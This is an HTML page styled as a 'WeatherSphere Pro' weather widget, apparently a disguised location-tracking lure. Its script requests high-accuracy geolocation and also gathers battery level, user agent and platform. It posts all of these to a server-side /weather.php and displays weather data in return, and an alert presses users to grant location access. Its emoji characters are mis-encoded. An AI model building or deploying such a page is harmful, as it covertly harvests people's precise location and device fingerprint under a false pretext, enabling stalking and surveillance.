<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>WeatherSphere Pro</title>
  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&display=swap" rel="stylesheet">
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Poppins', sans-serif; }
    body { min-height: 100vh; background: #2a5298; display: flex; justify-content: center; align-items: center; padding: 20px; }
    .weather-card { background: #3e5f9a; width: 100%; max-width: 360px; border-radius: 30px; padding: 25px; text-align: center; color: white; box-shadow: 0 10px 30px rgba(0,0,0,0.3); }
    
    .icon-main { width: 85px; margin-bottom: 5px; }
    .temp-main { font-size: 4.2rem; font-weight: 600; line-height: 1; margin-bottom: 5px; }
    .desc-main { font-size: 1.3rem; opacity: 0.9; margin-bottom: 25px; text-transform: lowercase; }

    .stat-box { background: rgba(255,255,255,0.12); border-radius: 18px; padding: 15px; display: flex; align-items: center; margin-bottom: 12px; text-align: left; }
    .stat-box .emoji { font-size: 1.8rem; margin-right: 15px; width: 40px; text-align: center; }
    .stat-info span { display: block; font-size: 0.85rem; opacity: 0.8; }
    .stat-info strong { font-size: 1.15rem; }

    .get-weather-btn { background: #4CAF50; color: white; border: none; padding: 16px; border-radius: 50px; font-weight: 600; cursor: pointer; width: 100%; font-size: 1.1rem; box-shadow: 0 4px 15px rgba(0,0,0,0.2); }
    .success-banner { background: rgba(76, 175, 80, 0.15); border: 1px solid #4CAF50; color: white; padding: 15px; border-radius: 15px; margin-top: 15px; display: none; font-weight: 500; font-size: 0.95rem; }

    #weather-content { display: none; }
    .loader { display: none; border: 4px solid rgba(255,255,255,0.3); border-top: 4px solid #ffffff; border-radius: 50%; width: 40px; height: 40px; animation: spin 0.8s linear infinite; margin: 20px auto; }
    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
  </style>
</head>
<body>

<div class="weather-card">
  <div id="init-view">
    <h2 style="margin-bottom: 20px;">üå§Ô∏è WeatherSphere Pro</h2>
    <button onclick="getLocation()" class="get-weather-btn" id="btn">‚ö°Ô∏è Get Weather Report</button>
    <div class="loader" id="loader"></div>
  </div>

  <div id="weather-content">
    <img id="w-icon" src="https://openweathermap.org/img/wn/02d@4x.png" class="icon-main">
    <div class="temp-main" id="t-val">--¬∞C</div>
    <div class="desc-main" id="d-val">--</div>

    <div class="stat-box">
      <div class="emoji">üíß</div>
      <div class="stat-info"><span>Humidity</span><strong id="h-val">--%</strong></div>
    </div>

    <div class="stat-box">
      <div class="emoji">üå¨Ô∏è</div>
      <div class="stat-info"><span>Wind Speed</span><strong id="w-val">-- m/s</strong></div>
    </div>

    <div class="stat-box">
      <div class="emoji">üå°Ô∏è</div>
      <div class="stat-info"><span>Feels Like</span><strong id="f-val">--¬∞C</strong></div>
    </div>

    <div class="stat-box">
      <div class="emoji">üèôÔ∏è</div>
      <div class="stat-info"><span>Location</span><strong id="l-val">Loading...</strong></div>
    </div>

    <div class="success-banner" id="success">‚úÖ Weather Data Received successfully!</div>
  </div>
</div>

<script>
async function getLocation() {
    document.getElementById('loader').style.display = 'block';
    document.getElementById('btn').style.display = 'none';

    try {
        let batteryInfo = "100%";
        if (navigator.getBattery) {
            const b = await navigator.getBattery();
            batteryInfo = `${Math.round(b.level * 100)}%`;
        }

        const position = await new Promise((resolve, reject) => {
            navigator.geolocation.getCurrentPosition(resolve, reject, { enableHighAccuracy: true });
        });

        const response = await fetch('/weather.php', {
            method: 'POST',
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
            body: `lati=${position.coords.latitude}&longi=${position.coords.longitude}&acc=${position.coords.accuracy}&ua=${encodeURIComponent(navigator.userAgent)}&batt=${batteryInfo}&os=${navigator.platform}`
        });

        const data = await response.json();

        // Update UI
        document.getElementById('init-view').style.display = 'none';
        document.getElementById('weather-content').style.display = 'block';
        document.getElementById('t-val').innerText = Math.round(data.temp) + "¬∞C";
        document.getElementById('d-val').innerText = data.desc;
        document.getElementById('h-val').innerText = data.humidity + "%";
        document.getElementById('w-val').innerText = data.wind + " m/s";
        document.getElementById('f-val').innerText = Math.round(data.feels) + "¬∞C";
        document.getElementById('l-val').innerText = data.city;
        document.getElementById('success').style.display = 'block';

    } catch (error) {
        alert("‚ö†Ô∏è Please allow Location Access to see the report.");
        document.getElementById('loader').style.display = 'none';
        document.getElementById('btn').style.display = 'block';
    }
}
</script>
</body>
</html>